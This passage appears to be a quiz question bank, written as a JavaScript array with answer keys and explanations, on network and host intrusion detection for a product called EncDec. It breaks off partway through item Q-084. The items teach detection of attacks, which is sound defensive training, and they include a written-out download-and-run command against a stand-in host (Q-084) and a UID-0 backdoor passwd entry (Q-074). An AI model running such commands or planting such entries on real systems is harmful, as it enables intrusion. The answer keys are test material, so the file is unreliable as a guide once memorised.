      'Alert timestamp, Severity, Threat Category, Source IP/Host, and recommended containment steps',
      'React component version and Tailwind CSS utility classes',
      'Admin Safe Box passkey hash and JWT secret string',
      'Browser User-Agent and local timezone offset only'
    ],
    correctIndex: 0,
    explanation: 'Actionable owner notifications include incident identity, timestamp, severity, origin/target indicators, and clear remediation guidance—never internal credentials.'
  },
  {
    id: 'Q-044',
    chapterNumber: 2,
    topic: 'Chapter 2: SOC Overview Dashboard & Executive Telemetry',
    difficulty: 'Hard',
    question: 'If Total Ingress Packets surge sharply while Detected Anomalies remain 0 and Rule Engine Compliance is 100%, what is the most sound initial hypothesis?',
    options: [
      'Critical ransomware has erased `/etc/passwd`.',
      'Legitimate traffic volume increased (e.g., normal business load) with active rules inspecting traffic cleanly—though sampling/drop counters should still be verified.',
      'Firestore circuit breaker has locked all admin accounts.',
      'DNS Cache Poisoning has disabled Layer 2 Ethernet.'
    ],
    correctIndex: 1,
    explanation: 'A high ingress spike with 100% rule compliance and zero anomalies typically reflects legitimate burst load, provided sensor drop counters confirm packets are not bypassing inspection.'
  },

  // =========================================================================
  // CHAPTER 3: Network IDS (NIDS) Operations & Packet Sniffer (Q-045 to Q-066)
  // =========================================================================
  {
    id: 'Q-045',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'How does EncDec’s Deep Packet Inspection (DPI) engine surpass traditional Layer-3/4 stateless packet filters?',
    options: [
      'It only inspects Ethernet MAC OUIs and VLAN 802.1Q tags.',
      'It reconstructs flows up to Application Layer 7 (HTTP, DNS, SSH, TLS) and inspects raw payloads for shellcode, SQLi, and C2 patterns.',
      'It strips IPv4 headers before routing traffic across physical switches.',
      'It caches user passwords in plaintext files for manual review.'
    ],
    correctIndex: 1,
    explanation: 'Unlike L3/L4 header-only ACLs, DPI reassembles streams and parses L7 application protocols and hex payloads for embedded exploits and evasion.'
  },
  {
    id: 'Q-046',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'In EncDec’s Snort/Suricata signature matrix (Chapter 3), which SID corresponds to "HTTP SQL Injection Pattern" on HTTP (L7), and what is its default action & severity?',
    options: [
      'SID 100001 • ALERT & LOG • CRITICAL',
      'SID 100003 • ALERT & BLOCK • CRITICAL',
      'SID 100004 • ALERT & DROP • MEDIUM',
      'SID 100006 • ALERT & ISOLATE • CRITICAL'
    ],
    correctIndex: 1,
    explanation: 'Chapter 3 specifies SID 100003 as HTTP SQL Injection Pattern targeting HTTP (L7) with default action ALERT & BLOCK and severity CRITICAL.'
  },
  {
    id: 'Q-047',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'During a TCP SYN Flood attack (SID 100001), which kernel resource on the victim server gets exhausted first unless SYN cookies or rate-limiting mitigation activates?',
    options: [
      'The DNS recursive resolver cache table',
      'The kernel’s half-open TCP connection backlog queue (`tcp_max_syn_backlog`) holding incomplete SYN_RECV TCB states',
      'The local SSD `/etc/shadow` inode table',
      'The UDP ephemeral socket buffer for ICMP echo replies'
    ],
    correctIndex: 1,
    explanation: 'Spoofed or abandoned SYN packets leave sockets stuck in SYN_RECV, filling the finite half-open backlog queue and blocking legitimate 3-way handshakes.'
  },
  {
    id: 'Q-048',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'Why does an Nmap TCP SYN stealth scan (`-sS`) still trigger SID 100002 (Sequential Port Sweep Recon) even though the attacker sends `RST` instead of completing the 3-way handshake?',
    options: [
      'Because `-sS` broadcasts ARP Who-Has frames to every port 21–8080.',
      'Because NIDS inspects raw TCP SYN headers arriving sequentially across ports regardless of whether an application-level socket completes `accept()`.',
      'Because Nmap embeds its software version string inside every IPv4 TTL field.',
      'Because SYN stealth scans only work over ICMP Type 8 packets.'
    ],
    correctIndex: 1,
    explanation: 'Stealth scans avoid full application connection logs, but NIDS operates at the wire level and observes the burst of half-open SYN probes sweeping multiple destination ports.'
  },
  {
    id: 'Q-049',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'In DNS Cache Poisoning (SID 100004), why must an off-path attacker guess or spoof both the 16-bit DNS Transaction ID (TXID) and source UDP port quickly before the authoritative reply arrives?',
    options: [
      'Because resolvers accept only the first matching response for a pending query tuple (IP, port, QNAME, TXID) and ignore subsequent duplicates.',
      'Because DNS queries always run over encrypted SSH tunnels on port 22.',
      'Because the resolver automatically reboots if two identical UDP packets arrive within 10 seconds.',
      'Because DNS TXIDs are 256-bit SHA-3 digests.'
    ],
    correctIndex: 0,
    explanation: 'If forged responses match the pending tuple before the legitimate authoritative response arrives, the poisoned RRset enters cache; SID 100004 flags mismatched/flooded TXID spoofing.'
  },
  {
    id: 'Q-050',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'Which rule pair in Chapter 3 maps respectively to "Sequential Port Sweep Recon" and "Outbound Suspicious Beacon"?',
    options: [
      'SID 100001 and SID 100004',
      'SID 100002 and SID 100006',
      'SID 100003 and SID 100005',
      'SID 100004 and SID 100005'
    ],
    correctIndex: 1,
    explanation: 'SID 100002 detects Sequential Port Sweep Recon (HIGH), and SID 100006 detects Outbound Suspicious Beacon (CRITICAL / ALERT & ISOLATE).'
  },
  {
    id: 'Q-051',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'How can an attacker evade naive string-matching Layer-7 SQL Injection rules, and what DPI technique defeats that evasion?',
    options: [
      'Using randomized UDP source ports; defeated by disabling UDP inspection.',
      'Using URL/hex double-encoding, SQL comments (`/**/`), and case-mixed obfuscation; defeated by protocol-aware HTTP URI/body normalization prior to pattern matching.',
      'Lowering the Ethernet MTU to 1500 bytes; defeated by enabling ICMP Smurf throttling.',
      'Sending HTTP requests over TCP port 80; defeated by switching to Telnet.'
    ],
    correctIndex: 1,
    explanation: 'Attackers obfuscate payloads with comments, whitespace variations, and double percent-encoding; Suricata/DPI normalizes HTTP buffers (`http_uri`, `http_client_body`) before matching.'
  },
  {
    id: 'Q-052',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'What distinguishes an HTTP Layer-7 Flood from a volumetric TCP SYN Flood on a web infrastructure?',
    options: [
      'HTTP L7 floods complete valid TCP handshakes and mimic legitimate GET/POST requests to exhaust worker threads/DB pools rather than just link bandwidth.',
      'HTTP L7 floods operate exclusively at Layer 2 using forged ARP broadcasts.',
      'TCP SYN floods require valid TLS client certificates to reach port 80.',
      'HTTP L7 floods generate zero packets visible to DPI sniffers.'
    ],
    correctIndex: 0,
    explanation: 'L7 floods pass basic L3/L4 stateless filters by completing valid TCP connections and hammering expensive backend HTTP endpoints or database queries.'
  },
  {
    id: 'Q-053',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'If an intruder attempts an evasion attack using overlapping IPv4 fragments with conflicting TCP payload bytes, why must NIDS perform stateful stream and fragment reassembly matching target host OS semantics?',
    options: [
      'Because without target-aware reassembly, the NIDS might inspect benign fragment A while the target OS kernel accepts malicious overlapping fragment B.',
      'Because fragmented IPv4 packets do not carry a destination IP address.',
      'Because MSSQL rejects any alert whose payload is less than 64 bytes.',
      'Because overlapping fragments convert TCP into UDP automatically.'
    ],
    correctIndex: 0,
    explanation: 'Classic Ptacek & Newsham evasion exploits OS-specific fragment overlap policies (first-wins vs last-wins); NIDS stream/frag3 reassemblers model target host OS behavior.'
  },
  {
    id: 'Q-054',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'What is the purpose of EncDec’s live Exploit Verification Suite (SYN Flood, TCP Port Scan, HTTP L7 Flood, DNS Cache Poisoning probes)?',
    options: [
      'To attack third-party external websites autonomously without authorization.',
      'To validate that internal DPI pipelines, firewall rules, and alert telemetry trigger reliably under controlled operational testing.',
      'To overwrite `/etc/passwd` baselines on production Linux servers.',
      'To bypass user password resets when Gmail OAuth fails.'
    ],
    correctIndex: 1,
    explanation: 'Controlled purple-team verification confirms rule sets, rate limiters, and SIEM telemetry pipelines accurately detect live attack vectors.'
  },
  {
    id: 'Q-055',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'According to Chapter 3, what default action is configured for SID 100005 (ICMP Ping of Death / Smurf)?',
    options: [
      'ALERT & DROP',
      'ALERT & THROTTLE',
      'ALERT & ISOLATE',
      'ALERT & LOG'
    ],
    correctIndex: 1,
    explanation: 'The Chapter 3 Rule SID matrix assigns SID 100005 (ICMP Ping of Death / Smurf) the default action `ALERT & THROTTLE` with severity `HIGH`.'
  },
  {
    id: 'Q-056',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'Why does a classic Smurf amplification attack amplify traffic toward a target even when the attacker controls minimal upstream bandwidth?',
    options: [
      'It sends TCP FIN packets to port 443 which triggers 10x TLS retransmissions.',
      'It sends ICMP Echo Requests with a spoofed victim source IP to subnet broadcast addresses, causing dozens of hosts to send Echo Replies simultaneously to the victim.',
      'It exploits DNSSEC RRSIG records over TCP port 53.',
      'It forces local host agents to replay SHA-256 hashes over HTTP.'
    ],
    correctIndex: 1,
    explanation: 'Smurf spoofs the victim’s IP as source in broadcast ICMP Echo Requests; every responding node on the broadcast network floods the victim with replies.'
  },
  {
    id: 'Q-057',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'Why does EncDec support enabling, disabling, and customizing signature rules dynamically without restarting the NIDS service?',
    options: [
      'Because restarting the packet sniffer erases all user accounts in Firestore.',
      'To avoid capture blind spots and dropped packets during urgent zero-day signature deployments or false-positive tuning.',
      'Because Node.js cannot spawn processes more than once per boot.',
      'Because disabling rules temporarily boosts AES-256 key entropy.'
    ],
    correctIndex: 1,
    explanation: 'Hot-reloading rules eliminates inspection downtime ("capture gaps") when mitigating fast-moving threats or noisy signatures.'
  },
  {
    id: 'Q-058',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'In Snort/Suricata multi-pattern matching, why does pairing a `fast_pattern` content prefilter with a PCRE regex prevent catastrophic CPU exhaustion?',
    options: [
      'Because `fast_pattern` compiles PCRE directly onto external browser GPUs.',
      'Aho-Corasick multi-pattern prefiltering discards >99% of unrelated packets in O(n) time so expensive PCRE backtracking only runs on candidate matches.',
      'PCRE expressions cannot inspect packets arriving on eth0.',
      'Because `fast_pattern` disables TCP checksum validation.'
    ],
    correctIndex: 1,
    explanation: 'Evaluating complex PCRE on every packet causes ReDoS/CPU starvation; an Aho-Corasick fast-pattern anchor gates expensive regex execution to matching flows.'
  },
  {
    id: 'Q-059',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'Which OSI/TCP-IP layer mapping correctly matches the protocol reconstruction pipeline described in Chapter 3?',
    options: [
      'Ethernet (L2), IPv4/IPv6 (L3), TCP/UDP/ICMP (L4), HTTP/DNS/SSH/TLS (L7)',
      'HTTP (L2), TCP (L3), Ethernet (L4), ARP (L7)',
      'DNS (L1), IPv4 (L2), TLS (L3), Ethernet (L7)',
      'ICMP (L2), SSH (L3), UDP (L5), IPv6 (L7)'
    ],
    correctIndex: 0,
    explanation: 'Chapter 3 outlines DPI reconstruction across Ethernet (L2), IPv4/IPv6 (L3), TCP/UDP/ICMP (L4), and Application protocols such as HTTP, DNS, SSH, and TLS (L7).'
  },
  {
    id: 'Q-060',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'When analyzing an outbound HTTPS beacon suspected of triggering SID 100006 even without TLS MITM decryption, which observables remain exposed to NIDS/NSM?',
    options: [
      'Plaintext HTTP GET query parameters inside TLS 1.3 application data records',
      'TLS handshake ClientHello SNI, JA3/JA4 cipher-suite fingerprint, destination IP/ASN, packet sizes, and inter-arrival beacon periodicity',
      'The remote attacker’s local `/etc/shadow` password hashes',
      'The SQL database row IDs inside the remote C2 server’s memory'
    ],
    correctIndex: 1,
    explanation: 'Even with TLS 1.3 encryption, ClientHello metadata (SNI, cipher/extension fingerprints like JA3/JA4), flow timing intervals, and byte-size distributions expose beaconing.'
  },
  {
    id: 'Q-061',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'Why does the EncDec live packet sniffer expose hex payload previews alongside decoded protocol filters (ALL, TCP, UDP, ICMP, DNS, HTTP)?',
    options: [
      'So analysts can visually spot shellcode NOP sleds (`0x90`), magic file headers, and binary protocol anomalies masked inside text fields.',
      'To permit analysts to manually edit packet checksums before forwarding.',
      'Because browsers require hexadecimal strings to authenticate OAuth scopes.',
      'So analysts can convert TCP flows into TopoJSON map coordinates by hand.'
    ],
    correctIndex: 0,
    explanation: 'Raw hex inspection reveals non-printable shellcode bytes, NOP sleds, covert tunnels, and obfuscated binary payloads that ASCII views hide.'
  },
  {
    id: 'Q-062',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'Why did the classic Ping of Death exploit crash legacy kernels, and how does modern DPI (SID 100005) detect it?',
    options: [
      'Sending an oversized >65,535-byte IPv4 datagram via fragmented ICMP Echo packets overflowed reassembly buffers; DPI inspects fragment offsets + total length limits.',
      'Sending 0-byte ICMP packets forced division-by-zero in ARP caches; DPI blocks all ICMP Type 0.',
      'Embedding SQL statements in ICMP Echo Reply payloads crashed DNS resolvers.',
      'Setting TTL = 255 caused infinite loopback flooding on port 80.'
    ],
    correctIndex: 0,
    explanation: 'Malformed fragments whose reassembled payload exceeded IPv4’s 65,535-byte architectural maximum triggered kernel overflows; DPI inspects fragment offsets and lengths.'
  },
  {
    id: 'Q-063',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'What operational consequence occurs if a passive IDS sensor is mistakenly left in inline IPS "DROP" mode with an untuned overly broad heuristic rule?',
    options: [
      'Legitimate production traffic can suffer self-inflicted denial of service (false-positive outage).',
      'Dropped packets are automatically forwarded faster via BGP null-routing.',
      'AES-256 encryption switches to plaintext HTTP transparently.',
      'Host agents purge `/var/log/auth.log`.'
    ],
    correctIndex: 0,
    explanation: 'Overly broad blocking rules in inline mode break legitimate user workflows; high-confidence tuning must precede automated DROP actions.'
  },
  {
    id: 'Q-064',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'When inspecting TCP flags on captured packets in the NIDS matrix, which flag combination (`SYN + FIN` or `FIN + PSH + URG`) indicates anomalous scanning/crafting?',
    options: [
      'Normal TLS 1.3 0-RTT session resumption handshake',
      'Illegal/Xmas-tree TCP flag combinations indicative of Nmap OS fingerprinting or firewall evasion probes',
      'Standard HTTP/2 multiplexing stream teardown',
      'DHCP lease renewal confirmation from a gateway router'
    ],
    correctIndex: 1,
    explanation: '`SYN+FIN` is protocol-contradictory, and `FIN+PSH+URG` characterizes Nmap Xmas scans designed to probe stateless ACLs and OS TCP stack responses.'
  },
  {
    id: 'Q-065',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Hard',
    question: 'Which protocol and port combination is primarily targeted by SID 100004 (DNS Transaction ID Spoofing)?',
    options: [
      'TCP port 22 (SSH)',
      'UDP port 53 (DNS)',
      'TCP port 443 (HTTPS)',
      'ICMP Type 8'
    ],
    correctIndex: 1,
    explanation: 'SID 100004 explicitly monitors DNS over UDP port 53 for spoofed transaction ID cache poisoning attempts.'
  },
  {
    id: 'Q-066',
    chapterNumber: 3,
    topic: 'Chapter 3: Network IDS (NIDS) Operations & Packet Sniffer',
    difficulty: 'Advanced',
    question: 'What is the primary diagnostic sign that a NIDS capture engine is experiencing "packet drop blindness" on a saturated 10GbE mirror span?',
    options: [
      'NIC ring-buffer / AF_PACKET drop counters increment while rule alert rates plateau despite rising wire utilization.',
      'Total Ingress Packets remains identically synced with MSSQL row counts at 1:1 ratio.',
      'TLS certificates automatically shorten from 2048-bit RSA to 1024-bit.',
      'Every DNS response returns NXDOMAIN.'
    ],
    correctIndex: 0,
    explanation: 'Tracking `droppedEvents` and kernel ring-buffer drops detects silent NIDS overload where malicious packets slip past uninspected.'
  },

  // =========================================================================
  // CHAPTER 4: Host IDS (HIDS) & Endpoint Security (Q-067 to Q-088)
  // =========================================================================
  {
    id: 'Q-067',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'How does EncDec’s File Integrity Monitoring (FIM) detect unauthorized tampering on critical OS binaries and files such as `/etc/passwd` and `/bin/systemd`?',
    options: [
      'By comparing periodic filenames and uppercase formatting against Windows Registry keys.',
      'By computing cryptographic SHA-256 digests and diffing them against verified immutable baseline hashes.',
      'By locking the entire filesystem read-only for all root maintenance tasks.',
      'By checking only file modification timestamps (`mtime`), which attackers cannot alter.'
    ],
    correctIndex: 1,
    explanation: 'Because attackers can forge timestamps (`timestomping`) and maintain identical byte sizes, cryptographic SHA-256 baseline diffing is required to detect single-bit binary or config tampering.'
  },
  {
    id: 'Q-068',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'Why does HIDS Process Auditing treat `www-data` spawning `/bin/bash` or `curl` as a critical anomaly?',
    options: [
      'Because Apache/Nginx workers always require interactive login shells to serve static CSS files.',
      'Web server service accounts should never execute interactive shells or outbound downloader utilities; this PPID-child lineage strongly indicates RCE/web-shell exploitation.',
      'Because `/bin/bash` consumes 100% of Cloud Firestore write quotas on launch.',
      'Because `www-data` is only permitted to execute binaries compiled for Windows Server 2022.'
    ],
    correctIndex: 1,
    explanation: 'An unprivileged web daemon spawning a shell or downloader (`bash`, `sh`, `curl`, `wget`) is a classic post-exploitation Indicator of Compromise (IoC) for Command Injection / web shells.'
  },
  {
    id: 'Q-069',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'Which Linux and Windows critical host files are explicitly highlighted for FIM cryptographic baselining in Chapter 4?',
    options: [
      '`/etc/passwd`, `/etc/shadow`, `/bin/systemd`, and `C:\\Windows\\System32\\drivers\\etc\\hosts`',
      '`/tmp/cache.tmp`, `~/.bash_history`, and `C:\\Users\\Public\\Desktop.ini`',
      '`/var/www/favicon.ico` and `C:\\pagefile.sys`',
      '`/proc/cpuinfo` and `/dev/null`'
    ],
    correctIndex: 0,
    explanation: 'Chapter 4 cites `/etc/passwd`, `/etc/shadow`, `/bin/systemd`, and `C:\\Windows\\System32\\drivers\\etc\\hosts` as prime FIM targets guarding authentication, init, and name resolution.'
  },
  {
    id: 'Q-070',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'Why does SHA-256 surpass legacy MD5 or CRC32 for File Integrity Monitoring in hostile threat environments?',
    options: [
      'CRC32 and MD5 are fast enough that attackers can craft colliding trojanized binaries matching a legitimate baseline digest, whereas SHA-256 provides 128-bit collision resistance.',
      'SHA-256 hashes are automatically decrypted back into original source code during forensics.',
      'CRC32 only works on FAT32 USB drives and fails on ext4 Linux partitions.',
      'MD5 hashes mutate randomly every 24 hours.'
    ],
    correctIndex: 0,
    explanation: 'Chosen-prefix collision attacks against MD5 are practical and CRC32 is non-cryptographic; SHA-256 makes malicious replacement with an identical hash computationally infeasible.'
  },
  {
    id: 'Q-071',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'Which Linux log source does EncDec’s HIDS Syslog & Auth Stream parse in sub-second intervals to detect SSH brute-force attacks and unauthorized `sudo` escalations?',
    options: [
      '`/var/log/auth.log`',
      '`/etc/fstab`',
      '`/usr/share/zoneinfo`',
      '`/var/spool/cron/crontabs/nobody`'
    ],
    correctIndex: 0,
    explanation: 'Linux authentication daemons (SSHD, PAM, `sudo`) emit login successes, failures, and privilege elevations to `/var/log/auth.log` (or `/var/log/secure` on RHEL variants).'
  },
  {
    id: 'Q-072',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'An attacker installs a userland rootkit via `LD_PRELOAD` to hide a malicious binary from `/bin/ps` and `ls`. Why does EncDec’s kernel-space eBPF HIDS agent still detect the hidden process?',
    options: [
      'Because eBPF executes `ps -ef` inside a Node.js child_process every 60 seconds.',
      'Because eBPF hooks kernel tracepoints/kprobes (`sched_process_exec`, `sys_enter_execve`) below glibc userland where `LD_PRELOAD` hooks cannot intercept.',
      'Because `LD_PRELOAD` only works on macOS Darwin kernels.',
      'Because FIM rewrites `/etc/ld.so.preload` every 10 milliseconds.'
    ],
    correctIndex: 1,
    explanation: '`LD_PRELOAD` tampers only with dynamically linked userland library calls; kernel-space eBPF hooks observe the true underlying syscalls and task structs directly, plus FIM alerts on `/etc/ld.so.preload` modification.'
  },
  {
    id: 'Q-073',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'Why does modifying `C:\\Windows\\System32\\drivers\\etc\\hosts` represent a severe security integrity threat if undetected?',
    options: [
      'It immediately disables AES-256 hardware acceleration on Intel CPUs.',
      'Attackers can redirect security update URLs, internal SSO domains, or SOC telemetry endpoints to malicious rogue IP addresses silently before DNS resolution.',
      'It forces Windows Server 2022 to format NTFS volumes on reboot.',
      'It exposes all OAuth Gmail refresh tokens in plaintext.'
    ],
    correctIndex: 1,
    explanation: 'The local `hosts` file overrides DNS lookups; tampering enables traffic hijacking, credential phishing, or telemetry sinkholing (blackholing EDR/SOC update endpoints).'
  },
  {
    id: 'Q-074',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'If FIM flags a modification on `/etc/passwd` alongside a newly added UID `0` account (`backdoor:x:0:0::/root:/bin/bash`), what immediate compromise capability did the attacker establish?',
    options: [
      'Anonymous guest read-only access to static web assets.',
      'Root-equivalent superuser privilege persistence masquerading under a secondary username.',
      'A Layer-2 ARP cache overflow on the edge router.',
      'Certificate Authority root revocation in Cloud Firestore.'
    ],
    correctIndex: 1,
    explanation: 'In Unix `/etc/passwd`, UID `0` grants unrestricted kernel superuser capabilities regardless of the account’s human-readable login name.'
  },
  {
    id: 'Q-075',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'What operational function does the HIDS Fleet Registry fulfill across heterogeneous enterprise servers?',
    options: [
      'Tracks OS distributions, IP addresses, kernel versions, CPU/RAM metrics, and live agent connectivity heartbeats.',
      'Generates quadratic Bézier SVG paths inside client browsers.',
      'Processes NOWPayments cryptocurrency invoice webhooks.',
      'Sends password reset OTPs directly from endpoint workstations.'
    ],
    correctIndex: 0,
    explanation: 'Fleet Registry maintains inventory and health telemetry (OS, kernel, IP, resource load, agent heartbeat) across Linux, Windows, and macOS endpoints.'
  },
  {
    id: 'Q-076',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'Why should an HIDS agent detect permission changes (`chmod +s` / SUID bit added) on binaries even when the binary’s file content SHA-256 hash remains unchanged?',
    options: [
      'Because adding the SUID bit lets any local unprivileged user execute that binary with the owner’s elevated privileges (often root) without modifying file bytes.',
      'Because `chmod +s` automatically encrypts the binary using AES-GCM.',
      'Because SUID disables `/var/log/auth.log` syslog forwarding.',
      'Because file bytes always scramble when permissions change.'
    ],
    correctIndex: 0,
    explanation: 'File metadata (mode, ownership, ACLs, extended attributes) lives in the inode rather than data blocks; setting SUID on a binary like `find` or `vim` creates an instant privesc backdoor while content SHA-256 stays unchanged.'
  },
  {
    id: 'Q-077',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'How does File Integrity Monitoring help catch ransomware or rootkits early in the attack lifecycle?',
    options: [
      'By tracking rapid mass file modifications/encryption entropy bursts or critical system binary alterations before payload execution completes.',
      'By uploading every user document to public Threat Intel feeds.',
      'By throttling network interface MTU to 68 bytes.',
      'By disabling cron jobs permanently on all hosts.'
    ],
    correctIndex: 0,
    explanation: 'Rapid unexpected writes, baseline binary mismatches, and boot/init modifications provide sub-second signals to isolate endpoints before encryption finishes.'
  },
  {
    id: 'Q-078',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'During HIDS Process Auditing, what baseline artifact is used to distinguish legitimate background services from newly dropped rogue binaries?',
    options: [
      'An authorized executable allowlist paired with expected parent-child PID trees and typical CPU/RAM envelopes.',
      'The alphabetical order of process names.',
      'Whether the process runs during daylight business hours in UTC.',
      'The TLS version of the operator’s browser.'
    ],
    correctIndex: 0,
    explanation: 'Allowlisted binary paths/hashes combined with expected PPID lineage quickly isolate masquerading binaries (e.g., `/tmp/.systemd` pretending to be `systemd`).'
  },
  {
    id: 'Q-079',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'A Linux host exhibits sudden heartbeat loss (`status: offline`) immediately after 3 failed `sudo` bursts and an unauthorized USB device mount (`usbConnected: true`). Which forensic step is highest priority?',
    options: [
      'Delete the host from Fleet Registry to restore green dashboard status.',
      'Preserve last-received auth/syscall/FIM telemetry out-of-band, suspect physical/agent-tampering neutralization, and inspect adjacent peers for lateral spread.',
      'Wait 72 hours to see if the host reconnects automatically.',
      'Reset Cloud Firestore sync debouncing timers.'
    ],
    correctIndex: 1,
    explanation: 'Sudden agent silence following anomalous auth/USB events strongly implies an attacker killed the HIDS daemon or physically unplugged/reimaged the node; central out-of-band telemetry holds the evidence.'
  },
  {
    id: 'Q-080',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'In Windows enterprise nodes monitored by EncDec HIDS, which native telemetry counterpart parallels Linux `/var/log/auth.log`?',
    options: [
      'Windows Security Event Logs',
      'Windows Print Spooler Temp Cache',
      'DirectX Shader Diagnostics',
      'IIS Favicon Manifest'
    ],
    correctIndex: 0,
    explanation: 'Chapter 4 pairs Linux `/var/log/auth.log` with Windows Security Event Logs for real-time authentication, failed logon, and privilege-escalation auditing.'
  },
  {
    id: 'Q-081',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'Why must authorized patching windows be integrated with FIM baseline management in production SOCs?',
    options: [
      'So operators can bypass `apt` / Windows Update signature verification.',
      'To distinguish scheduled vendor package upgrades from malicious binary tampering and re-sign authorized SHA-256 benchmarks cleanly.',
      'Because SHA-256 stops executing after kernel patch reboots.',
      'To turn off process auditing permanently during maintenance.'
    ],
    correctIndex: 1,
    explanation: 'Controlled re-baselining tied to change-management tickets prevents benign OS updates from flooding FIM with false alarms while preserving strict vigilance outside change windows.'
  },
  {
    id: 'Q-082',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'Why are cron jobs (`cronJobs`) explicitly captured inside EncDec’s `HostTelemetry` structure?',
    options: [
      'Scheduled tasks are a primary persistence vector adversaries abuse to survive reboots and re-spawn payloads.',
      'Cron jobs compute TopoJSON Natural Earth projections on headless servers.',
      'Cron daemons store user Gmail OAuth 2.0 refresh tokens.',
      'Cron schedules replace TCP keepalives in Suricata.'
    ],
    correctIndex: 0,
    explanation: 'Auditing scheduled cron tasks uncovers persistence mechanisms (e.g., `/etc/cron.d` downloading backdoors periodically) even if the initial process terminated.'
  },
  {
    id: 'Q-083',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'If an attacker executes a "fileless" payload exclusively via `memfd_create()` and `execveat()` without ever touching `/bin` or `/tmp` on disk, which HIDS mechanism still exposes the compromise?',
    options: [
      'Scheduled midnight disk-based SHA-256 FIM scans of `/etc/hosts` only',
      'Real-time kernel syscall & process lineage auditing observing anomalous execution from `memfd:` descriptors',
      'DNS cache TTL expiration alerts',
      'CSS Light/Dark contrast ratio assertions'
    ],
    correctIndex: 1,
    explanation: 'Fileless in-memory execution evades static disk FIM, but syscall monitoring (`memfd_create`/`execveat`) and process-tree lineage immediately expose execution from anonymous memory descriptors.'
  },
  {
    id: 'Q-084',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'When `www-data` spawns `curl http://malicious.tld/implant.sh | sh`, which two HIDS telemetry categories capture evidence simultaneously?',
    options: [
